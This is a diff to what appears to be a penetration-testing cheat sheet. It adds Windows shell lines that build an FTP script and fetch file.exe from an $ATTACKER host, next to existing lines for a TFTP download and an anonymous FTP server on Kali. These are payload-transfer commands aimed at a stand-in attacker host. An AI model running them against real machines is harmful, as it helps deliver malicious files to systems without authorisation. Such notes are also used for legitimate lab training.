@@ -142,8 +142,14 @@ tftp -i $ATTACKER get /download/location /save/location
 # Kali. Set up ftp server with anonymous logon;
 twistd -n ftp -p 21 -r /file/to/serve
 
-# Windows. Non-interactive FTP commands from file;
-ftp -s:ftp_commands.txt
+# Windows Shell. Read FTP commands from ftp-commands.txt non-interactively;
+echo open $ATTACKER>ftp-commands.txt
+echo anonymous>>ftp-commands.txt
+echo whatever>>ftp-commands.txt
+echo binary>>ftp-commands.txt
+echo get file.exe>>ftp-commands.txt
+echo bye>>ftp-commands.txt 
+ftp -s:ftp-commands.txt
 ```
 
 ##### Bash Ping Sweeper
